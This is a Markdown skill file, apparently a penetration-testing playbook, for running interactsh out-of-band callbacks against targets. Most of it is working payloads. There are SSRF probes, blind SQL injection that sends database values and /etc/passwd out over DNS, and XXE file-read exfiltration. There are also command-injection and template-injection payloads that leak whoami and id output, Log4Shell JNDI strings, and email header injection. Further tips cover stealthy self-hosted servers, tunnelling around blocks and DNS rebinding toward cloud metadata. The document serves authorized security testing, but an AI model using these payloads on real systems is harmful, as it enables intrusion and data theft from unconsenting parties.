---
name: interactsh
category: tooling
description: Operate interactsh-client for OAST — generate unique callback URLs, verify SSRF / XXE / blind-RCE / blind-SQLi / email-sending features, parse interaction logs, run a self-hosted server for stealth
depends_on: []
---

# interactsh — OAST Tool Operations

`interactsh-client` from ProjectDiscovery is the Swiss army knife for out-of-band detection. It generates a unique subdomain per test, listens for DNS + HTTP(S) + SMTP callbacks, and prints a structured record every time the target contacts your infrastructure. Use it whenever a probe could trigger a server-side network call — SSRF, blind XXE, blind SQLi out-of-band, blind RCE, JNDI/Log4Shell, email-forwarding flows, webhook test endpoints, file-import-by-URL, SSO callback ingestion.

## Install / Invoke

```bash
# Go install (preferred)
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
# Or pdtm
pdtm -i interactsh-client
```

Generic quick-start:
```bash
# Live tail — one session, stdout prints callbacks
interactsh-client -v

# JSON output (pipeable to jq / notes tool)
interactsh-client -json -o interactions.jsonl

# Persist session ID (so you can restart and still correlate)
interactsh-client -sf session.txt

# Rate-limit polling and set timeout
interactsh-client -p 60 -t 3600 -o iactsh.log
```

On first run it prints the unique **root** (e.g. `xyz123.oast.fun` or `xyz123.interactsh.com`). All subdomains of that root will route to your client. Copy it — you'll embed `.xyz123.oast.fun` in payloads.

## Payload Conventions

Always use a **unique sub-label per test** so you can correlate callback → payload:

```
<test-name>-<vuln-class>-<attempt>.<INTERACTSH-ROOT>

# Examples (replace xyz123.oast.fun with your current root)
ssrf-fetch-1.xyz123.oast.fun
xxe-external-entity.xyz123.oast.fun
sqli-time-oob.xyz123.oast.fun
blind-rce-wget.xyz123.oast.fun
email-register-admin.xyz123.oast.fun
```

When a DNS / HTTP hit comes in, interactsh-client prints the full subdomain — you instantly know WHICH probe fired WHICH interaction.

## Per-Attack-Class Payload Patterns

### SSRF

```bash
# Substitute $EP with ANY url-accepting endpoint on the target
# (proxy, fetch, preview, webhook-verify, import, screenshot, redirect-check, etc.)

# Plain HTTP fetch
curl "$TARGET/$EP?url=http://ssrf-http.$OAST/"

# Protocol variants
curl "$TARGET/$EP?url=http://ssrf-https.$OAST/"      # HTTPS (certificate warnings may block)
curl "$TARGET/$EP?url=gopher://ssrf-gopher.$OAST:80/"
curl "$TARGET/$EP?url=file:///$OAST"                 # file-protocol probe
curl "$TARGET/$EP?url=ldap://ssrf-ldap.$OAST/"       # JNDI hint

# Redirect-based (when allowlist checks first URL only)
# Host a 302 → http://ssrf-redir.$OAST/ on your own webhook.site, then:
curl "$TARGET/$EP?url=http://your-redirector.example/"
```

Observe DNS query for `ssrf-*.$OAST`. If you ONLY see DNS (no HTTP), target resolved but didn't fetch → still confirmed SSRF (DNS-only is a valid signal). If you see HTTP body in interactsh, you also have egress + protocol confirmation.

### Blind SQL Injection (OOB)

When no in-band oracle (error / boolean / time) works, fall to DNS:

```sql
-- MySQL (requires FILE privilege)
' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT @@version), '.sqli-mysql.xyz123.oast.fun\\\\a')) --

-- MSSQL (xp_dirtree)
'; DECLARE @q VARCHAR(1024); SET @q = '\\'+(SELECT TOP 1 CAST(user AS VARCHAR(50)))+'.sqli-mssql.xyz123.oast.fun\foo'; EXEC master..xp_dirtree @q --

-- PostgreSQL (COPY TO PROGRAM or dblink)
'; COPY (SELECT version()) TO PROGRAM 'nslookup $(cat /etc/passwd).sqli-pg.xyz123.oast.fun' --

-- Oracle (UTL_HTTP / HTTPURITYPE)
' || (SELECT UTL_HTTP.request('http://sqli-oracle.xyz123.oast.fun/?v='||banner) FROM v$version WHERE rownum=1) --
```

The subdomain label carries the extracted data (DB version, current user, row values). Each DNS query decodes to one extracted value.

### Blind XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://xxe-dtd.xyz123.oast.fun/evil.dtd">
  %ext;
]>
<foo>&pwn;</foo>
```

Host `evil.dtd` on the callback path (interactsh serves 200/empty by default; for payload delivery use burp collab, webhook.site, or a self-hosted interactsh server with file hosting):

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; pwn SYSTEM 'http://xxe-exfil.xyz123.oast.fun/?x=%file;'>">
%eval;
%pwn;
```

Signal: DNS for `xxe-dtd.$OAST` confirms outbound HTTP. DNS for `xxe-exfil.$OAST` with a subdomain containing the leaked hostname confirms full-read blind XXE.

### Blind Command Injection / RCE

```bash
# Shell command injection via `;` or `|`
curl "$TARGET/api/ping?host=127.0.0.1;nslookup%20rce-ping.xyz123.oast.fun"
curl "$TARGET/api/ping?host=127.0.0.1|wget%20http://rce-wget.xyz123.oast.fun/"

# Variant: use DNS exfil to ship data
curl "$TARGET/api/ping?host=127.0.0.1;nslookup%20\$(whoami).rce-whoami.xyz123.oast.fun"
curl "$TARGET/api/ping?host=127.0.0.1;nslookup%20\$(id|base64).rce-id.xyz123.oast.fun"
```

DNS logs show the executed-command output encoded into the subdomain. Handles: `nslookup`, `dig`, `curl`, `wget`, `ping -c1`, `host`, `drill`, `getent hosts`.

### JNDI / Log4Shell

```
${jndi:ldap://jndi-test.xyz123.oast.fun/a}
${jndi:ldap://${env:USER}.jndi-env.xyz123.oast.fun/a}
${jndi:dns://jndi-dns.xyz123.oast.fun}
```

Stuff into every user-controllable header/body field: `User-Agent`, `X-Forwarded-For`, `Referer`, email "Real Name", search query, file-upload filename. Any log line processed by Log4j triggers.

### Blind SSTI

```
<!-- Jinja2 -->
{{ request.__class__.__mro__[1].__subclasses__() }}  # info-leak (not OOB)
{% for x in ().__class__.__bases__[0].__subclasses__() %}{% if "subprocess" in x.__name__ %}{{ x("nslookup ssti-j.xyz123.oast.fun".split(),stdout=-1).communicate() }}{% endif %}{% endfor %}

# Freemarker
<#assign x="freemarker.template.utility.Execute"?new()>${x("nslookup ssti-f.xyz123.oast.fun")}

# Velocity
#set($x=$runtime.exec("nslookup ssti-v.xyz123.oast.fun"))
```

### Email-Registration / Password-Reset Flow Verification

**This is the most under-utilized pattern.** Many apps have server-to-server email flows (SMTP, queued, webhook) that you can observe:

```bash
# Register with an interactsh email — tests if email is sent AT ALL
curl -X POST "$TARGET/api/register" -H 'Content-Type: application/json' \
  -d '{"email":"reg-test-1@xyz123.oast.fun","password":"TestPass123!"}'

# Password reset — interactsh receives the reset email via SMTP
curl -X POST "$TARGET/api/password-reset" -H 'Content-Type: application/json' \
  -d '{"email":"reg-test-1@xyz123.oast.fun"}'

# Email header injection — inject \r\n Bcc: to smuggle a copy to attacker-controlled address
curl -X POST "$TARGET/api/contact" -H 'Content-Type: application/json' \
  -d '{"email":"target@example.com\r\nBcc: leak@xyz123.oast.fun","msg":"hi"}'
```

`interactsh-client` logs SMTP payloads — you see the full email body, including tokens, password-reset links, internal message IDs, X-Mailer signatures.

What this catches:
- **Unverified-registration flow** — if the email never arrives, account was created without email confirmation
- **Token-in-email disclosure** — reset tokens, invitation tokens visible in interactsh log
- **Header injection** — Bcc smuggling confirmed when your interactsh SMTP receives a copy
- **Email confirmation bypass** — if registering with `+` or `.` variants succeeds
- **Internal-hostname leakage** — email headers (Received, X-Mailer, Message-ID) expose internal SMTP hosts
- **IDN / homograph attacks** — register with `admin@xyz123.oaѕt.fun` (Cyrillic `s`)

### Webhook / SSO Callback Endpoints

Any endpoint that accepts a URL and later fetches it:

```bash
# Webhook verify endpoints
curl -X POST "$TARGET/api/integrations/webhook" -d '{"url":"http://webhook-verify.xyz123.oast.fun/"}'

# OAuth/OIDC redirect_uri (often SSRF if unvalidated)
curl "$TARGET/oauth/authorize?client_id=...&redirect_uri=http://oauth-redir.xyz123.oast.fun/"
```

## Parsing Interaction Logs

Default output (verbose) per interaction:
```
[xyz123.oast.fun] Received DNS interaction (A) from 1.2.3.4 at 2026-04-21 12:34:56
[xyz123.oast.fun] Received HTTP interaction from 1.2.3.4 at 2026-04-21 12:34:57
--- Request ---
GET /a HTTP/1.1
Host: xyz123.oast.fun
User-Agent: Go-http-client/1.1
...
```

JSON mode is machine-readable — prefer when piping to notes or automation:
```bash
interactsh-client -json -o iactsh.jsonl &
# ... run probes ...
jq -r 'select(.protocol=="dns") | "\(.full-id) <- \(.remote-address)"' iactsh.jsonl
jq -r 'select(.protocol=="http") | "\(.full-id) <- \(.remote-address) [\(.raw-request | split(\"\\n\")[0])]"' iactsh.jsonl
jq -r 'select(.protocol=="smtp") | .smtp-from + " → " + .smtp-to[0] + ": " + (.raw-request[:200])' iactsh.jsonl
```

Key fields:
- `protocol`: `dns | http | smtp | ftp | ldap | ssh | responder`
- `full-id`: the exact subdomain that was queried (correlate to payload)
- `unique-id`: the interactsh-specific random ID
- `remote-address`: source IP (the target — potentially the internal IP if SSRF)
- `raw-request` / `raw-response`: full HTTP or SMTP body
- `smtp-from`, `smtp-to`, `smtp-data`: SMTP-specific fields

## Self-Hosted Server (Stealth)

Default servers (`oast.fun`, `interactsh.com`) are well-known; some WAFs block them. Self-host for real targets:

```bash
# On your own server (requires wildcard DNS):
#   *.oast.yourbugbounty.com → this.server.ip
interactsh-server -d oast.yourbugbounty.com -A -cert /etc/letsencrypt/live/oast.yourbugbounty.com/fullchain.pem -privkey ...

# Client pointing to your server:
interactsh-client -s https://oast.yourbugbounty.com -token <auth-token>
```

Less fingerprintable, no rate limits, private logs. Use when the program allows OAST but denylists public OAST domains.

## False Positives

- Background services (antivirus, link-preview bots) crawling your callback URL from Slack/Teams if you posted the payload in a team channel. Use private scratchpads only.
- Your own browser previewing the interactsh URL if pasted into DevTools / tabs
- Caching intermediaries replaying old interactions — use unique sub-labels to disambiguate
- Some CDNs prefetch URLs in response bodies — verify the interaction SRC IP matches the target's egress, not a CDN

## Integration with Other Tools

- **nuclei**: many templates already use `{{interactsh-url}}` placeholder:
  ```bash
  nuclei -u $TARGET -t http/cves/ -interactsh-url https://oast.fun
  ```
- **sqlmap**: `--dns-domain` enables DNS exfiltration channel:
  ```bash
  sqlmap -u "$TARGET/item?id=1" --dns-domain=sqli.xyz123.oast.fun
  ```
- **httpx**: OAST-aware probe `httpx -rl 10 -interactsh-url https://oast.fun`
- **Burp Collaborator**: equivalent tool with tighter Burp integration (use when you're driving Burp manually)

## Pro Tips

1. Always prefix payloads with a descriptive label (`ssrf-fetch-1`, `xxe-dtd`, `reset-email-for-admin`). Raw random subdomains are useless when 30 interactions hit in a session.
2. Keep an interactsh session running in a tmux pane for the ENTIRE engagement. OAST callbacks can arrive minutes to hours after the probe (queued jobs, email delivery delay).
3. DNS-only interactions are valid — they prove outbound DNS resolution. HTTP adds confirmation of HTTP egress. Some internal networks block HTTP but leak DNS.
4. When SMTP callback arrives, grep the body for tokens: `jq -r '.raw-request' iactsh.jsonl | grep -oE 'https?://[^ ]+token=[^ &]+'`
5. For shared sessions across multiple attack types, use one interactsh-client and label payloads by prefix. For isolation-critical work (client engagement confidentiality), one session per engagement.
6. If target blocks `oast.fun` and `interactsh.com` but allows `.ngrok.io` / `.trycloudflare.com`, pipe via those tunnels to your local interactsh-server.
7. Interactsh automatically handles wildcard certs for HTTPS callbacks — no setup required to observe HTTPS interactions on default servers.

## Corpus-Derived Advanced Techniques

### Deserialization RCE via Webhook Body Templating

When a target allows defining webhook/callback bodies, test if the body passes through a template engine or serializer:
```bash
curl -X POST "$TARGET/api/webhooks" -H 'Content-Type: application/json' \
  -d '{"url":"http://deser-test.$OAST/","body":"rO0ABXNyABFqYXZhLmxhbmcuSW50ZWdlch..."}'
# Java: Base64 serialized object. .NET: BinaryFormatter. Python: pickle payload.
```

### DNS Rebinding via Two-Resolution TOCTOU

Bypass SSRF allowlists that validate-then-fetch with separate DNS resolutions. Set up a rebinding domain that alternates between allowed IP and `169.254.169.254`:
```bash
curl "$TARGET/api/fetch?url=http://rebind-toctou.$OAST/"
# First resolution returns allowed IP (passes validation), second returns metadata IP
```

### OAuth/SSO Callback Flow Auditing

Test every OAuth flow participant for SSRF, redirect bypass, and missing CSRF:
```bash
curl "$TARGET/auth/start?provider=github" -v 2>&1 | grep -i 'state='
curl "$TARGET/oauth/callback?redirect_uri=https://legit.target.tld/callback/../../../attacker.$OAST"
```
Check: is `state` bound to session? Is `redirect_uri` exact-match or prefix-match?

### Integration Webhook Mutable Field Audit

For any integration/webhook feature, test every mutable field that triggers a server-side fetch:
```bash
curl -X PATCH "$TARGET/api/integrations/123" -H 'Content-Type: application/json' \
  -d '{"webhook_url":"http://int-url.$OAST/","callback_host":"int-host.$OAST"}'
# Also test: host, port, path, token_endpoint, metadata_url, issuer_url
```

### Persistent OOB Monitoring for Delayed Callbacks

Some callbacks fire minutes to hours after injection (queued jobs, email delivery, cron):
```bash
interactsh-client -json -o long_session.jsonl -p 30 -t 86400 -sf session_persist.txt &
```

### Parameter-Name-Driven Payload Selection

Use parameter names as sink hints: `url/redirect/callback` -> SSRF, `template/body/content` -> SSTI with OOB, `file/path/import` -> XXE with OOB, `host/domain/endpoint` -> DNS callback, `email/to/bcc` -> SMTP header injection.
